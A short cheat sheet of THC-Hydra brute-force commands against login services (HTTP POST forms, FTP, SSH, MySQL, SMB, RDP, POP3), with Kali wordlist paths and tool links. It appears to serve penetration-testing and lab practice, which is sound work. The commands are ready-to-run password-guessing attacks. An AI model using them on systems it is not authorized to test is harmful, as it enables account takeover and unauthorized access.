# Brute Force THC-Hydra

## HTTP Post Web Form

$ hydra -L user-lst.txt -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/Login Page:Request Body:Error Message"

$ hydra -l admin -P /usr/share/wordlists/rockyou.txt http://example.com:8080  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

$ hydra -l molly -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."

$ hydra -l admin -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"

$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"

## FTP

$ hydra -f -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ftp -I

$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP -s 12021 ftp

$ hydra -L /full/path_to/user-name-list.txt -P /full/path_to/passwd-list.txt ftp://url-name.co

## SSH

$ hydra -f -l user_name -P /usr/share/wordlists/rockyou.txt Target_IP ssh -I

$ hydra -f -l user_name -P /usr/share/wordlists/rockyou.txt Target_IP -s 2222 ssh

$ hydra -l user_name -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 ssh

$ hydra -L /full/path_to/user-name-list.txt -P /full/path_to/passwd-list.txt ssh://url-name.co:2222

## MySQL

$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 mysql -I

## SMB

$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 smb

## RDP

$ hydra -f -l username -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 rdp -I

$ hydra -l username -P /usr/share/wordlists/rockyou.txt Target_IP -s 53389 rdp

$ hydra -L /full/path_to/user-name-list.txt -P /full/path_to/passwd-list.txt -t 4 -W 3 rdp://url-name.co:33389/

## POP3

$ hydra -f -l user-name -P /usr/share/wordlists/fasttrack.txt Target_IP pop3 -I

$ hydra -l user-name -P /usr/share/wordlists/fasttrack.txt Target_IP -s 10110 pop3

## Dir Kali Passwords Wordlists

/usr/share/wordlists/rockyou.txt

/usr/share/wordlists/fasttrack.txt

/usr/share/wordlists/john.lst

/usr/share/wordlists/nmap.lst

/usr/share/wordlists/legion

## Links

Fonte: https://www.stationx.net/how-to-use-hydra

Fonte: https://www.kali.org/tools/hydra

Fonte: https://github.com/vanhauser-thc/thc-hydra
